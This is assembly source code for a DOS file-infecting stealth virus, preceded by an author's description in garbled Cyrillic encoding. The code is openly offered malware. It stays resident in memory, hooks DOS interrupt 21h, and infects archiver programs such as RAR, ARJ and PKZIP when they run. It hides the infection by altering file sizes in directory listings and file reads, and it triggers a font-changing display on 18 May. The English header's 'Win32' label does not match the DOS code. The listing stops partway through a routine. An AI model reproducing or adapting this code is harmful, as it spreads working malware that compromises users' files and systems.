   COMMENT %

     PE-EXE.CRYPT. A very simple non-tsr Win32 virus. Scannes for
     files in the current directory and infects it by appending to
     the last section.

      ‚¨àãá, ª®â®àë© á¥©ç á ¯¥à¥¤ ¢ ¬¨, ¡ë«  ¯¨á  ¥é¥ ¯®« £®¤   § ¤, ®
   ¯®«®áâìî ¤®¤¥« âì ¨ ®ä®à¬¨âì ¥£® ã ¬¥ï  è«®áì ¢à¥¬ï â®«ìª® á¥©ç á. *â®â
   ¢¨àãá ï¢«ï¥âáï à¥ «¨§ æ¨¥© ¤®¢®«ì® áâ à®© ¨¤¥¨, ®, ¢¨¤¨¬® ¨§-§  á«®¦®áâ¨
    «£®à¨â¬ , ¤àã£¨å ¢®¯«®é¥¨© íâ®© ¨¤¥¨, ¯® ¬®¨¬ ¤ ë¬, ¥â. ˆâ ª, ¢ ç¥¬ ¦¥
   § ª«îç ¥âáï ¢áï ä¨èª ? € ¤¥«® ¢ â®¬, çâ® ¢¨àãá ¨ç¥£®   ¤¨áª ¥ ¯¨è¥â
   (§  ¨áª«îç¥¨¥¬ ¨¦¥ ®£®¢®à¥ëå á«ãç ¥¢). *® ¢ â ª®¬ á«ãç ¥ ¢®§¨ª ¥â
   á¯à ¢¥¤«¨¢ë© ¢®¯à®á: ª ª ¦¥ â®£¤  ¢¨àãá à §¬®¦ ¥âáï? ‚ ¤ ®© à¥ «¨§ æ¨¨
   ¥¬ã ¯®¬®£ îâ  àå¨¢ â®àë (å®âï ¬®£ãâ ¡ëâì ¨ ¤àã£¨¥ ¢ à¨ âë).
      ’¥¯¥àì ¯® ¯®àï¤ªã. ‘ ç «  ®â¢¥çã   â ª®© ¢®¯à®á: ª ª, ¥ ¨§¬¥ïï ä ©«,
   á¤¥« âì â ª, çâ®¡ë ä ©« ª § «áï § à ¦¥ë¬? Žáâ ¥¬áï à¥§¨¤¥â® ¨ ¯¥à¥å¢ âë¢ ¥¬
   á«¥¤ãîé¨¥ äãªæ¨¨ 21-£® ¯à¥àë¢ ¨ï:

      - 4Eh, 4Fh (çâ¥¨¥ ª â «®£®¢)
      - 3Fh (çâ¥¨¥ ¨§ ä ©« )
      - 42h (ãáâ ®¢ª  ãª § â¥«ï ¢ ä ©«¥)

      „ «¥¥ ¬ë ¢ë¯®«ï¥¬ ¤¥©áâ¢¨ï, ®¡à âë¥ ¤¥©áâ¢¨ï¬ Stealth-¢¨àãá®¢. *à¨ çâ¥¨¨
   ª â «®£®¢ ã¢¥«¨ç¨¢ ¥¬ ¢ DTA à §¬¥à ä ©« -¦¥àâ¢ë   ¤«¨ã ¢¨àãá . *à¨ çâ¥¨¨ ¨§
   ä ©«  ¯à®¢¥àï¥¬, £¤¥  å®¤¨âáï ãª § â¥«ì ¨, ¥á«¨ ®  å®¤¨âáï   MZ-EXE
   § £®«®¢ª¥ (¬ë à ¡®â ¥¬ â®«ìª® á MZ-EXE ä ©« ¬¨) ¨«¨   ¯à¥¤¯®« £ ¥¬®¬ ¬¥áâ¥
   à á¯®«®¦¥¨ï ¢¨àãá  ¢ ä ©«¥ (¢  è¥¬ á«ãç ¥ íâ® áà §ã ¯®á«¥ ª®æ  ä ©« ), â®
   ¯®¤áâ ¢«ï¥¬ CX ¡ ©â ¨§ MZ-EXE § £®«®¢ª , ª®â®àë© âãâ ¦¥ £¥¥à¨àã¥¬ (â ª ¦¥,
   ª ª íâ® ¤¥« îâ ¯à¨ ®¡ëç®¬ § à ¦¥¨¨), ¨«¨ ¨§ ª®¤  ¢¨àãá  á®®â¢¥âáâ¢¥®, ¯®
    ¤à¥áã DS:DX. ’® ¥áâì, ¬ë § à ¦ ¥¬ ¥ á ¬ ä ©«,   ¡ãää¥à, ¢ ª®â®àë© ¥£® ç¨â îâ
   (§ à ¦ ¥¬ ä ©« ¢ ¯ ¬ïâ¨). ’ ª¨¬ ®¡à §®¬, ¯à®£à ¬¬ , ¯à®ç¨â ¢è ï ä ©«, ¯®«ãç¨â
   ¥£® § à ¦¥ë¬. *®«¥¥ ¤¥â «ì®¥ ®¯¨á ¨¥  «£®à¨â¬  ¯à¨¢®¤¨âáï ®â¤¥«ì®.
      …áâ¥áâ¢¥®, çâ® ¯¥à¥¤ â¥¬, ª ª ¢ë¯®«ïâì ¢ëè¥®¯¨á ë¥ ¤¥©áâ¢¨ï, ¬ë á ç « 
   ¯à®¢¥àï¥¬ â¨¯ ä ©«  (® ¤®«¦¥ ¡ëâì MZ-EXE, ª ª ã¦¥ ¡ë«® áª § ®) ¨ ¥£®
   ¯à¨£®¤®áâì ¤«ï § à ¦¥¨ï (®âáãâáâ¢¨¥ ®¢¥à«¥¥¢),   â ª¦¥ ¤¥« ¥¬ ¯à®¢¥àªã  
   ¯®¢â®à®¥ § à ¦¥¨¥ (¯à¨§ ª § à ¦¥®áâ¨ ä ©«  - 6666h ¢ ¯®«¥ ª®âà®«ì®©
   áã¬¬ë MZ-EXE § £®«®¢ª ).
      ’¥¯¥àì á ¬®¥ £« ¢®¥. ‚á¥, çâ®  ¯¨á ® ¢ëè¥, ¯à¨ ®¡ëçëå ãá«®¢¨ïå ®âª«îç¥®
   ¨  ªâ¨¢¨àã¥âáï â®«ìª® â®£¤ , ª®£¤  ¯®«ì§®¢ â¥«ì § ¯ãáª ¥â  àå¨¢ â®à (RAR, ARJ,
   PKZIP ¨«¨ HA). „«ï íâ®£® ¢¨àãá ¯¥à¥å¢ âë¢ ¥â äãªæ¨î 4Bh (§ ¯ãáª ä ©« ). Ÿá®,
   çâ® ¢  àå¨¢ å ä ©«ë ®ª ¦ãâáï § à ¦¥ë¬¨, ¢ â® ¢à¥¬ï ª ª   ¤¨áª¥ ®¨ ®áâ ãâáï
   ¥âà®ãâë¬¨.
      *®¬¨¬® ¢á¥£® ¯à®ç¥£®, ¢¨àãá § à ¦ ¥â ãª § ë¥ ¢ëè¥  àå¨¢ â®àë ¯à¨ ¨å
   § ¯ãáª¥ (íâ® ª ª à § â®â ¥¤¨áâ¢¥ë© á«ãç ©, ª®£¤  ¢¨àãá çâ®-â® ¯¨è¥â  
   ¤¨áª). *à¨ § à ¦¥¨¨  àå¨¢ â®à®¢ ¢¨àãá ®¡à ¡ âë¢ ¥â  âà¨¡ãâ "’®«ìª® çâ¥¨¥",
   ¥ ¨§¬¥ï¥â  âà¨¡ãâ®¢ ¨ ¢à¥¬¥¨ á®§¤ ¨ï ä ©« ,   â ª¦¥ ¥ £«îç¨â   § é¨é¥ëå
   ®â § ¯¨á¨ ¤¨áª¥â å.
      *à®ï¢«¥¨¥: 18 ¬ ï ¢¨àãá ãáâ  ¢«¨¢ ¥â   int 1Ch á¢®© ®¡à ¡®âç¨ª, ª®â®àë©
   á®§¤ ¥â  ¨¬ æ¨®ë© íää¥ªâ á ¥ª®â®àë¬¨ èà¨äâ ¬¨.

                                     DJ Sadovnikov (http://i.am/djsad), 26.09.2000

    ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                  Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+

                     tasm /m archiver.asm
                     tlink /3 /x archiver.obj
                     del archiver.obj


                  ” ©«ë ¨§  àå¨¢ :

                     archiver.asm 23700 (¨áå®¤¨ª ¢¨àãá )
                     archiver.exe  2100 (¡¨ à¨ª ¢¨àãá )
                     archiver.doc  3300 (®¯¨á ¨¥  «£®à¨â¬ )
   %









   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286
   Code        segment use16
           assume  cs:Code, ds:Code
           org 0

           mov ah, 9
           mov dx, offset Msg+100h
           int 21h
           mov ax, 4C00h
           int 21h

   Msg     db  'Virus has started...$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                 *€—€‹Ž ‚ˆ*“‘€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Virus:      pusha
           push    ds es

           call    Entry
   Entry:      pop si
           sub si, Entry-Virus


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           mov ax, 0ABCDh
           int 21h
           cmp ax, 0DCBAh
           je  Exit


   ;[“ª®à ç¨¢ ¥¬ ¤«¨ã â¥ªãé¥£® ¡«®ª  ¯ ¬ïâ¨]

           mov ax, ds
           dec ax
           mov ds, ax
           mov bx, ds:[3]
           sub bx, MemSize/16+2
           mov ah, 4Ah
           int 21h
           jc  Exit


   ;[*¥à¥áâ ¢«ï¥¬ int 21h   int 65h]

           mov ax, 3521h
           int 21h
           mov ax, 2565h
           mov dx, bx
           push    es
           pop ds
           int 21h


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¢¨àãá ]

           mov ah, 48h
           mov bx, MemSize/16+1
           int 21h
           jc  Exit
           mov es, ax


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           dec ax
           mov ds, ax
           mov ds:[1], word ptr 8


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ ¢ë¤¥«¥ãî ¯ ¬ïâì]

           cld
           push    cs
           pop ds
           xor di, di
           mov cx, CodeSize
           push    si
           rep movsb
           pop si


   ;[“áâ  ¢«¨¢ ¥¬ ®¢ë© ®¡à ¡®âç¨ª int 21h]

           mov ax, 2521h
           mov dx, Int21h-Virus
           push    es
           pop ds
           int 21h


   ;[*à®¢¥àï¥¬ á¨áâ¥¬ãî ¤ âã]

           mov ax, 0807h
           out 70h, al
           in  al, 71h
           xchg    ah, al
           out 70h, al
           in  al, 71h
           cmp ax, 1805h
           jne Exit


   ;[‘®åà ï¥¬  ¤à¥á áâ à®£® ®¡à ¡®âç¨ª  int 1Ch]

           mov ax, 351Ch
           int 65h
           mov ds:[Ofs1Ch-Virus], bx
           mov ds:[Seg1Ch-Virus], es


   ;[“áâ  ¢«¨¢ ¥¬ ®¢ë© ®¡à ¡®âç¨ª int 1Ch]

           mov ax, 251Ch
           mov dx, Int1Ch-Virus
           int 65h


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ § à ¦¥®© ¯à®£à ¬¬¥]

   Exit:       pop es ds
           mov ax, ds
           add ax, 10h
           add cs:[OldCS+0-Virus+si], ax
           add cs:[OldSS+1-Virus+si], ax
           popa
           jmp $+2


           cli
   OldSS:      mov sp, 0
           mov ss, sp
   OldSP:      mov sp, 0
           sti

           db  0EAh
   OldIP       dw  0
   OldCS       dw  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                           Ž**€*Ž’—ˆŠ INT 1Ch
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int1Ch:     pusha
           push    ds es

           push    cs
           pop ds
           push    0B800h
           pop es

           cmp ds:[Flag1-Virus], byte ptr 0
           jne WaitTic

           mov dx, 3C4h
           mov al, 2
           out dx, al
           inc dx
           mov al, 4
           out dx, al
           dec dx
           out dx, al
           inc dx
           out dx, al
           mov dx, 3CEh
           mov al, 6
           out dx, al
           inc dx
           mov al, 0Ch
           out dx, al

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           mov ax, Font1-Virus
           mov bx, Font1Ofs-Virus
           mov di, 32*'.'
           call    Font

           mov ax, Font2-Virus
           mov bx, Font2Ofs-Virus
           mov di, 32*'\'
           call    Font

           mov ax, Font3-Virus
           mov bx, Font3Ofs-Virus
           mov di, 32*','
           call    Font

           mov ax, Font4-Virus
           mov bx, Font4Ofs-Virus
           mov di, 32*':'
           call    Font

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           mov dx, 3CEh
           mov al, 6
           out dx, al
           inc dx
           mov al, 0DEh
           out dx, al
           mov dx, 3C4h
           mov al, 4
           out dx, al
           inc dx
           mov al, 3
           out dx, al
           dec dx
           mov al, 2
           out dx, al
           inc dx
           mov al, 3
           out dx, al

   WaitTic:    not byte ptr ds:[Flag1-Virus]
           pop es ds
           popa

           db  0EAh
   Ofs1Ch      dw  0
   Seg1Ch      dw  0


   Font:       mov si, ds:[bx]
           mov cx, 15
           cld
           rep movsb
           cmp si, bx
           jne L1
           mov si, ax
   L1:     mov ds:[bx], si
           ret


   Flag1       db  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                           Ž**€*Ž’—ˆŠ INT 21h
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int24h:     mov al, 3
           iret

   Int21h:     cmp ax, 0ABCDh
           jne NotTest
           mov ax, 0DCBAh
           iret

   NotTest:    cmp ah, 4Bh
           je  Func4B
           cmp cs:[Flag2-Virus], byte ptr 0
           je  Quit

           cmp ah, 4Eh
           je  Func4E
           cmp ah, 4Fh
           je  Func4E

           cmp bx, 4
           jbe Quit

           cmp ah, 3Fh
           je  Func3F
           cmp ax, 4202h
           je  Func42

   Quit:       int 65h
           jc  QuitSTC

   QuitCLC:    push    bp
           mov bp, sp
           and [bp+6], byte ptr 11111110b
           pop bp
           iret

   QuitSTC:    push    bp
           mov bp, sp
           or  [bp+6], byte ptr 00000001b
           pop bp
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                          Ž**€*Ž’—ˆŠ ‡€*“‘Š€ ”€‰‹€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Func4B:     pusha
           mov cs:[Flag2-Virus], byte ptr 0


   ;[“áâ  ¢«¨¢ ¥¬ SI    ç «® ¨¬¥  ä ©« ]

           mov di, dx
           mov si, di
   Loop1:      cmp ds:[di], byte ptr '\'
           jne L2
           mov si, di
           inc si
   L2:     inc di
           cmp ds:[di], byte ptr 0
           jne Loop1


   ;[*à®¢¥àï¥¬ ¨¬ï ä ©« ]

           mov ax, ds:[si]
           and ax, 0DFDFh
           mov di, Arhivat-Virus
           call    CmpStr
           jnc NotArhiv


   ;[‡ à ¦ ¥¬  àå¨¢ â®à]

           not byte ptr cs:[Flag2-Virus]
           call    Infect

   NotArhiv:   popa
           jmp Quit

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                      Ž**€*Ž’—ˆŠ *…*…Œ…™…*ˆŸ “Š€‡€’…‹Ÿ
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Func42:     call    TestFile
           jc  Quit

           add dx, CodeSize
           adc cx, 0
           jmp Quit

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                          Ž**€*Ž’—ˆŠ —’…*ˆŸ ˆ‡ ”€‰‹€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Func3F:     jcxz    Quit

           call    TestFile
           jc  Quit

           int 65h
           jc  QuitSTC

           push    ax
           push    bx
           call    Exec3F
           pop bx
           pop ax

           jmp QuitCLC

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                           Ž**€*Ž’—ˆŠ —’…*ˆŸ Š€’€‹Žƒ€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Func4E:     int 65h
           jc  QuitSTC

           pusha
           push    ds
           push    es


   ;[‘®åà ï¥¬  ¤à¥á ®¡à ¡®âç¨ª  Int 24h]

           mov ax, 3524h
           int 65h
           push    es
           push    bx


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 24h]

           call    Set24h


   ;[*®«ãç ¥¬  ¤à¥á DTA]

           mov ah, 2Fh
           int 65h
           jc  Rest24h
           push    es
           pop ds


   ;[* ©¤¥ ï § ¯¨áì - ¤¨à¥ªâ®à¨ï ¨«¨ ¬¥âª  â®¬ ?]

           test    ds:[bx+15h], byte ptr 00011000b
           jnz Rest24h
           mov cs:[OldBX+1-Virus], bx


   ;[Žâªàë¢ ¥¬  ©¤¥ë© ä ©«]

           mov ax, 3D00h
           lea dx, [bx+1Eh]
           int 65h
           jc  Rest24h
           xchg    ax, bx


   ;[*à®¢¥àï¥¬ ¥£® ¯à¨£®¤®áâì]

           call    TestFile


   ;[‡ ªàë¢ ¥¬ ä ©«]

           pushf
           mov ah, 3Eh
           int 65h
           popf
           jc  Rest24h


   ;[“¢¥«¨ç¨¢ ¥¬ à §¬¥à ä ©«    ¤«¨ã ¢¨àãá ]

   OldBX:      mov bx, 0
           add ds:[bx+1Ah], CodeSize
           adc ds:[bx+1Ch], word ptr 0


   ;[‚®ááâ  ¢«¨¢ ¥¬ áâ àë© ®¡à ¡®âç¨ª Int 24h]

   Rest24h:    mov ax, 2524h
           pop dx
           pop ds
           int 65h

           pop es
           pop ds
           popa
           jmp QuitCLC

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                             ‡€*€†…*ˆ… €*•ˆ‚€’Ž*Ž‚
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Infect:     push    ds
           push    es


   ;[‘®åà ï¥¬ ¢¥ªâ®à Int24h]

           mov ax, 3524h
           int 65h
           push    es
           push    bx


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 24h]

           push    ds dx
           call    Set24h
           pop dx ds


   ;[‘®åà ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4300h
           int 65h
           jc  Fault
           push    cx
           push    dx
           push    ds


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h
           xor cx, cx
           int 65h
           jc  RestAttr


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov ax, 3D02h
           int 65h
           jc  RestAttr
           xchg    bx, ax


   ;[‘®åà ï¥¬ ¢à¥¬ï ¨ ¤ âã á®§¤ ¨ï ä ©« ]

           mov ax, 5700h
           int 65h
           jc  Close
           push    dx
           push    cx


   ;[*à®¢¥àï¥¬ ¯à¨£®¤®áâì ä ©« ]

           call    TestFile
           jc  RestTime


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© § £®«®¢®ª]

           mov ah, 40h
           mov cx, 18h
           mov dx, Header-Virus
           push    cs
           pop ds
           int 65h
           jc  RestTime


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢ ª®¥æ ä ©« ]

           mov al, 2
           call    Seek
           jc  RestTime


   ;[‡ ¯¨áë¢ ¥¬ ª®¤ ¢¨àãá ]

           mov ah, 40h
           mov cx, CodeSize
           xor dx, dx
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

   RestTime:   mov ax, 5701h
           pop cx
           pop dx
           int 65h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      mov ah, 3Eh
           int 65h


   ;‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop ds
           pop dx
           pop cx
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¢¥ªâ®à Int 24h]

   Fault:      mov ax, 2524h
           pop dx
           pop ds
           int 65h

           pop es
           pop ds
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               **Ž‚…*Š€ **ˆƒŽ„*Ž‘’ˆ ”€‰‹€ ˆ ‘Ž‡„€*ˆ… ‡€ƒŽ‹Ž‚Š€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   TestFile:   pusha
           push    ds

           push    cs
           pop ds


   ;[‘®åà ï¥¬ â¥ªãéãî ¯®§¨æ¨î ¢ ä ©«¥]

           mov al, 1
           call    Seek
           jc  Error
           mov ds:[CurPos-Virus], ax
           mov ds:[CurPos+2-Virus], dx


   ;[‘®åà ï¥¬ à §¬¥à ä ©« ]

           mov al, 2
           call    Seek
           jc  Error
           mov ds:[FSize-Virus], ax
           mov ds:[FSize+2-Virus], dx


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           mov al, 0
           call    Seek
           jc  Error


   ;[‘ç¨âë¢ ¥¬ § £®«®¢®ª EXE-ä ©« ]

           mov ah, 3Fh
           mov cx, 18h
           mov dx, Header-Virus
           int 65h
           jc  Error


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   3Ch ¡ ©â ®â  ç «  ä ©« ]

           mov ax, 4200h
           xor cx, cx
           mov dx, 3Ch
           int 65h
           jc  Error


   ;[‘ç¨âë¢ ¥¬  ¤à¥á NewEXE § £®«®¢ª ]

           mov ah, 3Fh
           mov cx, 4
           mov dx, Temp-Virus
           int 65h
           jc  Error


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   NewEXE § £®«®¢®ª]

           mov ax, 4200h
           mov dx, ds:[Temp-Virus]
           mov cx, ds:[Temp+2-Virus]
           int 65h
           jc  Error


   ;[‘ç¨âë¢ ¥¬ ¯¥à¢ë¥ ¤¢  ¡ ©â  NewEXE § £®«®¢ª ]

           mov ah, 3Fh
           mov cx, 2
           mov dx, Temp-Virus
           int 65h
           jc  Error


   ;[‚®ááâ  ¢«¨¢ ¥¬ â¥ªãéãî ¯®§¨æ¨î ¢ ä ©«¥]

           mov ax, 4200h
           mov dx, ds:[CurPos-Virus]
           mov cx, ds:[CurPos+2-Virus]
           int 65h
           jnc NoError


   ;[‚ëå®¤¨¬ ¨§ ¯®¤¯à®£à ¬¬ë]

   Error:      stc
           pop ds
           popa
           ret


